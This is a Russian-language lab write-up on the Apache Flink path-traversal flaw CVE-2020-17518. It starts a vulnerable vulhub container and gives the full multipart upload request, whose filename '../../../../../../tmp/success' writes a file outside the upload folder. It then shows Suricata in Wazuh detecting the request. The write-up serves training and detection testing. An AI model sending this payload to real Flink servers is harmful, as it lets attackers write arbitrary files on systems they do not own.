# CVE-2020-17518

### Материалы:

* [https://nvd.nist.gov/vuln/detail/CVE-2020-17518](https://nvd.nist.gov/vuln/detail/CVE-2020-17518)
* [https://www.opencve.io/cve/CVE-2020-17518](https://www.opencve.io/cve/CVE-2020-17518)
* [https://www.programmersought.com/article/236511184567/](https://www.programmersought.com/article/236511184567/)

Apache Flink - это фреймворк для обработки потоков с открытым исходным кодом, обладающий мощными возможностями потоковой и пакетной обработки.

В Apache Flink 1.5.1 появился REST-обработчик, позволяющий записать загруженный файл в произвольное место локальной файловой системы через злонамеренно измененный HTTP HEADER.

### Эксплуатация уязвимости

> Контейнер с уязвимой средой находится в директории /home/user/Hackathon/vulhub-master/flink/CVE-2020-17518

Для запуска узявимой среды выполните команду

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:8081 будет доступна домашняя страница Apache Flink

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Для эксплуатации уязвимости отправьте соответствующий POST-запрос:

```
POST /jars/upload HTTP/1.1
Host: ваш-ip:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 187

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"

success
------WebKitFormBoundaryoZ8meKnrrso89R6Y--

```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

После его отправки будет на машине будет создан файл /tmp/success

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

В Wazuh ([https://ваш-ip/app/wazuh](https://xn---ip-5cdj7k/app/wazuh)) мы можем увидеть, что Suricata детектирует действия как эксплуатацию CVE-2021-1499

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
